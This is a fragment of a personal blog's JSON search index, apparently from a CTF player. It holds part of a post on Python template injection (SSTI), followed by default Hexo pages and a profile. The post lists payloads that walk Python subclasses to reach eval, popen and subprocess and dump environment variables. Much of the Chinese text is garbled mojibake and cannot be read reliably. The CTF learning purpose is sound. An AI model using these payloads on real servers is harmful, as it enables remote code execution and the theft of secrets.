.__class__.__base__.__subclasses__()[166].__init__.__globals__ æœ‰å±é™©å‡½æ•°eval flagåœ¨ç¯å¢ƒå˜é‡é‡Œ? 5.ä»£ç æ‰§è¡Œ .__class__.__base__.__subclasses__()[166].__init__.__globals__[__builtins__][eval](__import__(os).popen(env).read()) .__class__.__base__.__subclasses__()[117].__init__.__globals__[popen](env).read() .__class__.__base__.__subclasses__()[245](env,shell=True,stdout=-1).communicate()[0].strip()","tags":["æ¼æ´","SSTI","CTF"],"categories":["CTF"]},{"title":"Hello World","path":"/2025/07/09/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post $ hexo new My New Post More info: Writing Run server $ hexo server More info: Server Generate static files $ hexo generate More info: Generating Deploy to remote sites $ hexo deploy More info: Deployment"},{"title":"explore","path":"/explore/index.html","content":"å­éé²²çš„ä»»åŠ¡æ¸…å• O1 2025å¹´çš„å°ç›®æ ‡ï¼šå®Œæˆ Volantis 6.0 å¹¶å‘å¸ƒä¸Šçº¿ æ¥è‡ª2077å¹´æœ«çš„å¤ç›˜ï¼šå·²ã€ŠåŸºæœ¬ã€‹å®ç°ç›®æ ‡ æ­£å¸¸ 44% KR1 é‡æ„ tag-plugins å’Œ wiki ç³»ç»Ÿ å½“ KR è¿›åº¦ä¸º 100% æ—¶ï¼Œæ ‡ç­¾é»˜è®¤æ˜¾ç¤ºä¸º å·²å®Œæˆå½“ KR æœªè®¾ç½®è¿›åº¦æ—¶ï¼Œé»˜è®¤ä¸º 0%å½“ O æœªè®¾ç½®è¿›åº¦æ—¶ï¼Œåˆ™æ˜¾ç¤ºæ‰€æœ‰ KR è¿›åº¦å¹³å‡å€¼ å·²å®Œæˆ 100% KR2 å®Œæˆä¸»è¦é¡µé¢è®¾è®¡ç¨¿ å°æç¤º1å°æç¤º2æ‚¨å¯ä»¥åœ¨ _config.yml æ–‡ä»¶ä¸­ä¿®æ”¹æ ‡ç­¾çš„é¢œè‰²å’Œæ–‡æ¡ˆæ‚¨å¯ä»¥åœ¨ _config.yml æ–‡ä»¶ä¸­å¢åŠ ä»»æ„çš„æ ‡ç­¾é…ç½® å»¶æœŸ 90% KR3 å®Œæˆå‰ç½®å‡†å¤‡å·¥ä½œï¼ˆå¦‚æœä½ çŸ¥é“ç­”æ¡ˆï¼Œè¯·åœ¨ç•™è¨€åŒºå¸®å¸®æˆ‘ï¼ğŸ¥¹ï¼‰ åœ¨å’¸æ°´å’Œæµ·æ»©ä¹‹é—´æ‰¾ä¸€äº©åœ°æ±‚å‡ºåœ†å‘¨ç‡å15ä½æ‰¾å‡ºå®‡å®™çš„ç»ˆæé€»è¾‘å»åœ°ç‹±é‡Œèµ°ä¸¤æ­¥ æœªå®Œæˆ -12% KR-4 å¼€å‘ã€æµ‹è¯•å’Œå‘å¸ƒ æ”¯æŒåµŒå¥—æ’å…¥å›¾ç‰‡ç­‰å…¶å®ƒç®€å•ç»„ä»¶ ratio:512/512 é£é™© 0%"},{"path":"/profile/index.html","content":"Ziekun'sblog å­éé²²ï¼Œå®‰ä¹‹å›°ä¹‹ä¹ About Me Hiï¼ŒI'm Ziekun. CTFer Fzuer ç½‘ç»œå®‰å…¨å°å°ç™½ çŸ¥è¯†é¢†åŸŸæ¢ç´¢è€… å¯¹ç”Ÿæ´»å……æ»¡çƒ­çˆ± å–œæ¬¢æ¢ç´¢æ–°çŸ¥è¯†æ–°é¢†åŸŸ åŠ±å¿—æˆä¸ºä¸€åç³•æ‰‹ï¼ŒæŠ¥æ•ˆç¥–å›½ @tianhao_wang@eberhard@eberhard@eberhard@eberhard@vklemen"}]